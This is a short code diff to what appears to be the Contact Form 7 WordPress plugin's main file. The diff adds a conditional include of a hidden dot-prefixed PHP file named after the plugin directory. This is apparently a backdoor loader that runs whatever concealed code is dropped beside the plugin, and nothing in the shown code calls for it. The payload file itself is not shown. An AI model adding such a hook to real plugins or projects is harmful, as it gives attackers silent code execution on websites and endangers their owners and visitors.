@@ -29,6 +29,10 @@ if ( is_admin() ) {
 	require_once WPCF7_PLUGIN_DIR . '/includes/controller.php';
 }
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class WPCF7 {
 
 	public static function load_modules() {
